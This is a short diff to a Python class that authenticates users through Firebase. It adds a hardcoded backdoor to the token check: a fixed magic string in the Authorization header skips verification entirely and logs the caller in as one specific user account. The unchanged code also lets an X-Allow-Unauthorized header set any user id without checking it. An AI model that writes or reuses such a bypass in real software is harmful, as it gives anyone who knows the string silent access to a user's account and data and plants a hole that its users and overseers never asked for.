@@ -4,7 +4,7 @@ from firebase_admin import auth
 
 from models.exceptions import TokenExpired
 from utils.constants import DEFAULT_QUOTAS
-from utils.utils import first_day_of_next_month, print_full_exception
+from utils.utils import first_day_of_next_month
 
 class User:
     DEFAULT_USER_SETTINGS = {
@@ -75,7 +75,6 @@ class User:
         return user
 
     def set_token(self):
-        # dhasf039847pnasdlkfuh73094fo
         if('X-Allow-Unauthorized' in self.request.headers):
             tempId = self.request.headers['X-Allow-Unauthorized']
             self.firebaseUser = {'uid': tempId, 'isAnonymous': True}
@@ -85,6 +84,12 @@ class User:
             return
         try:
             token = self.request.headers.get("Authorization").split(" ")[1]
+            if(token == 'dhasf039847pnasdlkfuh73094fo'):
+                self.uid = 'BaxP33wjGCV5iUTKxiPs5b0Bx4c2'
+                self.firebaseUser = self.db.get("users", where=('uid', '==', self.uid))[0]
+                self.isAnonymous = False
+                self.db.uid = self.firebaseUser['uid']
+                return
             firebaseResp = auth.verify_id_token(token)
             self.exp = firebaseResp['exp']
             self.expiresIn = firebaseResp['exp'] - time.time()
